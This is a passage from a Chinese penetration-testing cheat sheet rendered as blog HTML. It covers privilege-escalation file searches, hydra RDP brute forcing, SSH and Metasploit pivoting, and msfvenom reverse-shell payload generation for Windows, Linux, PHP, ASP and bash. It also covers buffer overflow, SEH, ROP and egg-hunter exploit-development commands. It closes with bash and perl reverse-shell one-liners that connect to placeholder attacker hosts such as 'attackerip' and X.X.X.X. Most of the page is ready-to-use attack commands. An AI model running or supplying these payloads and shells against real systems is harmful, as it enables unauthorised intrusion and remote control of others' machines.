-4000 -o -perm -2000 -<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找不属于任何用户的文件:</span></span><br><span class="line">find / -nouser -<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找不属于任何用户组的文件:</span></span><br><span class="line">find / -nogroup -<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找软连接及其指向:</span></span><br><span class="line">find / -<span class="built_in">type</span> l -ls</span><br></pre></td></tr></table></figure>
+<h3 id="python-shell"><a href="#python-shell" class="headerlink" title="python shell"></a>python shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
+<h3 id="python-Ruby-PHP-HTTP服务器"><a href="#python-Ruby-PHP-HTTP服务器" class="headerlink" title="python\Ruby\PHP HTTP服务器"></a>python\Ruby\PHP HTTP服务器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer</span><br><span class="line">python3 -m http.server</span><br><span class="line">ruby -rwebrick -e <span class="string">"WEBrick::HTTPServer.new(:Port =&gt; 8888, :D</span></span><br><span class="line"><span class="string"> ocumentRoot =&gt; Dir.pwd).start"</span></span><br><span class="line">php -S 0.0.0.0:8888</span><br></pre></td></tr></table></figure>
+<h3 id="获取进程对应的PID"><a href="#获取进程对应的PID" class="headerlink" title="获取进程对应的PID"></a>获取进程对应的PID</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fuser -nv tcp 80</span><br><span class="line">fuser -k -n tcp 80</span><br></pre></td></tr></table></figure>
+<h3 id="使用hydra爆破RDP"><a href="#使用hydra爆破RDP" class="headerlink" title="使用hydra爆破RDP"></a>使用hydra爆破RDP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp</span><br></pre></td></tr></table></figure>
+<h3 id="挂载远程windows共享文件夹"><a href="#挂载远程windows共享文件夹" class="headerlink" title="挂载远程windows共享文件夹"></a>挂载远程windows共享文件夹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw</span><br></pre></td></tr></table></figure>
+<h3 id="kali下编译exploit"><a href="#kali下编译exploit" class="headerlink" title="kali下编译exploit"></a>kali下编译exploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o output32 hello.c (32 位)</span><br><span class="line">gcc -m64 -o output hello.c (64 位)</span><br></pre></td></tr></table></figure>
+<h3 id="kali编译windows-Exploit"><a href="#kali编译windows-Exploit" class="headerlink" title="kali编译windows Exploit"></a>kali编译windows Exploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</span><br><span class="line">wine mingw-get-setup.exe</span><br><span class="line">select mingw32-base</span><br><span class="line"><span class="built_in">cd</span> /root/.wine/drive_c/windows</span><br><span class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span><br><span class="line"><span class="built_in">cd</span> /root/.wine/drive_c/MinGW/bin</span><br><span class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</span><br><span class="line">wine ability.exe</span><br></pre></td></tr></table></figure>
+<h3 id="NASM命令"><a href="#NASM命令" class="headerlink" title="NASM命令"></a>NASM命令</h3><p>注：NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f bin -o payload.bin payload.asm</span><br><span class="line">nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload</span><br></pre></td></tr></table></figure></p>
+<h3 id="SSH穿透"><a href="#SSH穿透" class="headerlink" title="SSH穿透"></a>SSH穿透</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1080 -p 22 user@IP</span><br><span class="line">Add socks4 127.0.0.1 1080 <span class="keyword">in</span> /etc/proxychains.conf</span><br><span class="line">proxychains commands target</span><br></pre></td></tr></table></figure>
+<h3 id="SSH穿透从一个网络到另一个网络"><a href="#SSH穿透从一个网络到另一个网络" class="headerlink" title="SSH穿透从一个网络到另一个网络"></a>SSH穿透从一个网络到另一个网络</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1080 -p 22 user1@IP1</span><br><span class="line">Add socks4 127.0.0.1 1080 <span class="keyword">in</span> /etc/proxychains.conf</span><br><span class="line">proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2</span><br><span class="line">Add socks4 127.0.0.1 1081 <span class="keyword">in</span> /etc/proxychains.conf</span><br><span class="line">proxychains commands target</span><br></pre></td></tr></table></figure>
+<h3 id="使用metasploit进行穿透"><a href="#使用metasploit进行穿透" class="headerlink" title="使用metasploit进行穿透"></a>使用metasploit进行穿透</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">route add X.X.X.X 255.255.255.0 1</span><br><span class="line">use auxiliary/server/socks4a</span><br><span class="line">run</span><br><span class="line">proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.offensive-security.com/metasploit-unleashed/pivoting/</span></span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">IP Address  : 10.1.13.3</span><br><span class="line">meterpreter &gt; run autoroute -s 10.1.13.0/24</span><br><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line">10.1.13.0          255.255.255.0      Session 1</span><br><span class="line">meterpreter &gt; Ctrl+Z</span><br><span class="line">msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; <span class="built_in">set</span> RHOST 10.1.13.2</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br><span class="line">meterpreter &gt; ipconfig</span><br><span class="line">IP Address  : 10.1.13.2</span><br></pre></td></tr></table></figure>
+<h3 id="基于CSV文件查询Exploit-DB"><a href="#基于CSV文件查询Exploit-DB" class="headerlink" title="基于CSV文件查询Exploit-DB"></a>基于CSV文件查询Exploit-DB</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/offensive-security/exploit-database.git</span><br><span class="line"><span class="built_in">cd</span> exploit-database</span><br><span class="line">./searchsploit –u</span><br><span class="line">./searchsploit apache 2.2</span><br><span class="line">./searchsploit <span class="string">"Linux Kernel"</span></span><br><span class="line"></span><br><span class="line">cat files.csv | grep -i linux | grep -i kernel | grep -i <span class="built_in">local</span> | grep -v dos | uniq | grep 2.6 | egrep <span class="string">"&lt;|&lt;="</span> | sort -k3</span><br></pre></td></tr></table></figure>
+<h3 id="MSF-Payloads"><a href="#MSF-Payloads" class="headerlink" title="MSF Payloads"></a>MSF Payloads</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b <span class="string">"\x00"</span> -a x86 --platform win -f c</span><br></pre></td></tr></table></figure>
+<h3 id="MSF生成在linux下反弹的Meterpreter-Shell"><a href="#MSF生成在linux下反弹的Meterpreter-Shell" class="headerlink" title="MSF生成在linux下反弹的Meterpreter Shell"></a>MSF生成在linux下反弹的Meterpreter Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell</span><br></pre></td></tr></table></figure>
+<h3 id="MSF生成反弹Shell"><a href="#MSF生成反弹Shell" class="headerlink" title="MSF生成反弹Shell"></a>MSF生成反弹Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b <span class="string">"\x00\x0a\x0d"</span> -a x86 --platform win -f c</span><br></pre></td></tr></table></figure>
+<h3 id="MSF生成反弹Python-Shell"><a href="#MSF生成反弹Python-Shell" class="headerlink" title="MSF生成反弹Python Shell"></a>MSF生成反弹Python Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py</span><br></pre></td></tr></table></figure>
+<h3 id="MSF生成反弹ASP-Shell"><a href="#MSF生成反弹ASP-Shell" class="headerlink" title="MSF生成反弹ASP Shell"></a>MSF生成反弹ASP Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp</span><br></pre></td></tr></table></figure>
+<p>###　MSF 生成反弹 Bash Shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh</span><br></pre></td></tr></table></figure></p>
+<h3 id="MSF-生成反弹-PHP-Shell"><a href="#MSF-生成反弹-PHP-Shell" class="headerlink" title="MSF 生成反弹 PHP Shell"></a>MSF 生成反弹 PHP Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php</span><br><span class="line">add &lt;?php at the beginning</span><br><span class="line">perl -i~ -0777pe<span class="string">'s/^/&lt;?php \n/'</span> shell.php</span><br></pre></td></tr></table></figure>
+<h3 id="MSF-生成反弹-Win-Shell"><a href="#MSF-生成反弹-Win-Shell" class="headerlink" title="MSF 生成反弹 Win Shell"></a>MSF 生成反弹 Win Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe</span><br></pre></td></tr></table></figure>
+<h3 id="Linux-常用安全命令"><a href="#Linux-常用安全命令" class="headerlink" title="Linux 常用安全命令"></a>Linux 常用安全命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 uid 查找对应的程序</span></span><br><span class="line">find / -uid 0 -perm -4000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找哪里拥有写权限</span></span><br><span class="line">find / -perm -o=w</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找名称中包含点和空格的文件</span></span><br><span class="line">find / -name <span class="string">" "</span> -<span class="built_in">print</span></span><br><span class="line">find / -name <span class="string">".."</span> -<span class="built_in">print</span></span><br><span class="line">find / -name <span class="string">". "</span> -<span class="built_in">print</span></span><br><span class="line">find / -name <span class="string">" "</span> -<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找不属于任何人的文件</span></span><br><span class="line">find / -nouser</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找未链接的文件</span></span><br><span class="line">lsof +L1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取进程打开端口的信息</span></span><br><span class="line">lsof -i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 看看 ARP 表中是否有奇怪的东西</span></span><br><span class="line">arp -a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有账户</span></span><br><span class="line">getent passwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有用户组</span></span><br><span class="line">getent group</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列举所有用户的 crontabs</span></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(getent passwd|cut -f1 -d:); <span class="keyword">do</span> <span class="built_in">echo</span> <span class="string">"### Crontabs for <span class="variable">$user</span> ####"</span>; crontab -u <span class="variable">$user</span> -l; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机密码</span></span><br><span class="line">cat /dev/urandom| tr -dc ‘a-zA-Z0-9-_!@<span class="comment">#$%^&amp;*()_+&#123;&#125;|:&lt;&gt;?=’|fold -w 12| head -n 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找所有不可修改的文件</span></span><br><span class="line">find . | xargs -I file lsattr -a file 2&gt;/dev/null | grep ‘^….i’</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使文件不可修改</span></span><br><span class="line">chattr -i file</span><br></pre></td></tr></table></figure>
+<h3 id="Windows-缓冲区溢出利用命令"><a href="#Windows-缓冲区溢出利用命令" class="headerlink" title="Windows 缓冲区溢出利用命令"></a>Windows 缓冲区溢出利用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b <span class="string">"\x00"</span> -f c</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=443 -a x86 --platform win -e x86/shikata_ga_nai -b <span class="string">"\x00"</span> -f c</span><br><span class="line"></span><br><span class="line">COMMONLY USED BAD CHARACTERS:</span><br><span class="line">\x00\x0a\x0d\x20                              For http request</span><br><span class="line">\x00\x0a\x0d\x20\x1a\x2c\x2e\3a\x5c           Ending with (0\n\r_)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用命令:</span></span><br><span class="line">pattern create</span><br><span class="line">pattern offset (EIP Address)</span><br><span class="line">pattern offset (ESP Address)</span><br><span class="line">add garbage upto EIP value and add (JMP ESP address) <span class="keyword">in</span> EIP . (ESP = shellcode )</span><br><span class="line"></span><br><span class="line">!pvefindaddr pattern_create 5000</span><br><span class="line">!pvefindaddr suggest</span><br><span class="line">!pvefindaddr modules</span><br><span class="line">!pvefindaddr nosafeseh</span><br><span class="line"></span><br><span class="line">!mona config -<span class="built_in">set</span> workingfolder C:\Mona\%p</span><br><span class="line">!mona config -get workingfolder</span><br><span class="line">!mona mod</span><br><span class="line">!mona bytearray -b <span class="string">"\x00\x0a"</span></span><br><span class="line">!mona pc 5000</span><br><span class="line">!mona po EIP</span><br><span class="line">!mona suggest</span><br></pre></td></tr></table></figure>
+<h3 id="SEH-–-结构化异常处理"><a href="#SEH-–-结构化异常处理" class="headerlink" title="SEH – 结构化异常处理"></a>SEH – 结构化异常处理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH</span></span><br><span class="line"><span class="comment"># http://baike.baidu.com/view/243131.htm</span></span><br><span class="line">!mona suggest</span><br><span class="line">!mona nosafeseh</span><br><span class="line">nseh=<span class="string">"\xeb\x06\x90\x90"</span> (next seh chain)</span><br><span class="line">iseh= !pvefindaddr p1 -n -o -i (POP POP RETRUN or POPr32,POPr32,RETN)</span><br></pre></td></tr></table></figure>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>注：ROP(“Return-Oriented Programming”)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。<br>DEP(“Data Execution Prevention”)是一套软硬件技术，在内存上严格将代码和数据进行区分，防止数据当做代码执行。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://en.wikipedia.org/wiki/Return-oriented_programming</span></span><br><span class="line"><span class="comment"># https://zh.wikipedia.org/wiki/%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B</span></span><br><span class="line"><span class="comment"># https://en.wikipedia.org/wiki/Data_Execution_Prevention</span></span><br><span class="line"><span class="comment"># http://baike.baidu.com/item/DEP/7694630</span></span><br><span class="line">!mona modules</span><br><span class="line">!mona ropfunc -m *.dll -cpb <span class="string">"\x00\x09\x0a"</span></span><br><span class="line">!mona rop -m *.dll -cpb <span class="string">"\x00\x09\x0a"</span> (auto suggest)</span><br></pre></td></tr></table></figure></p>
+<h3 id="ASLR-–-地址空间格局随机化"><a href="#ASLR-–-地址空间格局随机化" class="headerlink" title="ASLR – 地址空间格局随机化"></a>ASLR – 地址空间格局随机化</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://en.wikipedia.org/wiki/Address_space_layout_randomization</span></span><br><span class="line"><span class="comment"># http://baike.baidu.com/view/3862310.htm</span></span><br><span class="line">!mona noaslr</span><br></pre></td></tr></table></figure>
+<h3 id="寻蛋-EGG-Hunter-技术"><a href="#寻蛋-EGG-Hunter-技术" class="headerlink" title="寻蛋(EGG Hunter)技术"></a>寻蛋(EGG Hunter)技术</h3><p>Egg hunting这种技术可以被归为“分级shellcode”，它主要可以支持你用一小段特制的shellcode来找到你的实际的（更大的）shellcode（我们的‘鸡蛋‘），原理就是通过在内存中搜索我们的最终shellcode。换句话说，一段短代码先执行，然后再去寻找真正的shellcode并执行。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/</span></span><br><span class="line"><span class="comment"># http://www.pediy.com/kssd/pediy12/116190/831793/45248.pdf</span></span><br><span class="line"><span class="comment"># http://www.fuzzysecurity.com/tutorials/expDev/4.html</span></span><br><span class="line">!mona jmp -r esp</span><br><span class="line">!mona egg -t lxxl</span><br><span class="line">\xeb\xc4 (jump backward -60)</span><br><span class="line">buff=lxxllxxl+shell</span><br><span class="line">!mona egg -t <span class="string">'w00t'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="GDB-Debugger-常用命令"><a href="#GDB-Debugger-常用命令" class="headerlink" title="GDB Debugger 常用命令"></a>GDB Debugger 常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置断点</span></span><br><span class="line"><span class="built_in">break</span> *_start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行下一个命令</span></span><br><span class="line">next</span><br><span class="line">step</span><br><span class="line">n</span><br><span class="line">s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 继续执行</span></span><br><span class="line"><span class="built_in">continue</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据</span></span><br><span class="line">checking <span class="string">'REGISTERS'</span> and <span class="string">'MEMORY'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示寄存器的值: (Decimal,Binary,Hex)</span></span><br><span class="line"><span class="built_in">print</span> /d –&gt; Decimal</span><br><span class="line"><span class="built_in">print</span> /t –&gt; Binary</span><br><span class="line"><span class="built_in">print</span> /x –&gt; Hex</span><br><span class="line">O/P :</span><br><span class="line">(gdb) <span class="built_in">print</span> /d <span class="variable">$eax</span></span><br><span class="line"><span class="variable">$17</span> = 13</span><br><span class="line">(gdb) <span class="built_in">print</span> /t <span class="variable">$eax</span></span><br><span class="line"><span class="variable">$18</span> = 1101</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$eax</span></span><br><span class="line"><span class="variable">$19</span> = 0xd</span><br><span class="line">(gdb)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示特定内存地址的值</span></span><br><span class="line"><span class="built_in">command</span> : x/nyz (Examine)</span><br><span class="line">n –&gt; Number of fields to display ==&gt;</span><br><span class="line">y –&gt; Format <span class="keyword">for</span> output ==&gt; c (character) , d (decimal) , x (Hexadecimal)</span><br><span class="line">z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit)</span><br></pre></td></tr></table></figure>
+<h3 id="BASH反弹Shell"><a href="#BASH反弹Shell" class="headerlink" title="BASH反弹Shell"></a>BASH反弹Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0</span><br><span class="line"><span class="built_in">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span> <span class="comment"># or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/attackerip/4444</span><br><span class="line"></span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span> <span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line">/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<h3 id="PERL-反弹-Shell"><a href="#PERL-反弹-Shell" class="headerlink" title="PERL 反弹 Shell"></a>PERL 反弹 Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Win 平台</span></span><br><span class="line">perl -MIO -e <span class="string">'$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;’</span></span><br></pre></td></tr></table></figure>
